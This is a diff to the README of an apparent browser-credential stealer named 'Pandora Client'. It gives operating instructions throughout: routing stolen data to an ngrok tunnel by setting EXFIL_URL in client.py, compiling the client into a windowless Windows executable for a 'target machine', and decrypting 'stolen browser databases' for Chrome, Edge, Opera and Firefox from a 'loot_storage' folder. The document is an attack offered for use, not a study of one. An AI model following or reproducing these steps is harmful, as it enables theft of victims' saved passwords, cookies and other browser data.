@@ -79,7 +79,7 @@ The server runs on port 3000 by default.
 
 2.1. Download and install Nrog.
 
-2.2. Authenticate your account: ngrok config add-authtoken YOUR_TOKEN_HERE
+2.2. Authenticate your account: ```ngrok config add-authtoken YOUR_TOKEN_HERE```
 
 2.3. Start the tunnel:
 
@@ -89,10 +89,10 @@ ngrok http 3000
 
 2.4. Copy the Forwarding URL (e.g., https://random-id.ngrok-free.dev).
 
-2.5. Update Client: Open client.py and replace EXFIL_URL with your Ngrok URL (keep the /upload suffix).
+2.5. Update Client: Open ```client.py``` and replace ```EXFIL_URL``` with your Ngrok URL (keep the ```/upload``` suffix).
 
 ## 3. Compiling the Client to EXE (Target Machine)
-​To convert the client.py into a standalone Windows executable:
+​To convert the ```client.py``` into a standalone Windows executable:
 
 3.1. Install Build Tools:
 
@@ -109,14 +109,20 @@ python -m PyInstaller --noconsole --onefile --icon=ICON.ico --name "Pandora Clie
 
 3.3. Your executable will be located in the dist/ folder.
 
-## 4. Decryption
+## 4. chrome, EDGE Opera Decryption
 ​The stolen browser databases are encrypted. To read them:
 
 4.1. ​Extract the .db file and the .key file from the received ZIP in loot_storage.
 
 ​4.2. Open decrypt.py.
 
-​4.3. Paste the Master Key into MASTER_KEY_BASE64 and set the DB_FILE path.
+​4.3. Paste the Master Key into ```MASTER_KEY_BASE64``` and set the ```DB_FILE```path.
 
-​4.4. Run: python decrypt.py
+​4.4. Run: ```python decrypt.py```
 
+## 5. Firefox Decryption
+​The stolen browser databases are encrypted. To read them:
+
+5.1. ​Extract the .db file and the .key file from the received ZIP in loot_storage.
+
+​5.2. Run: ```python firefox_decrypt.py```
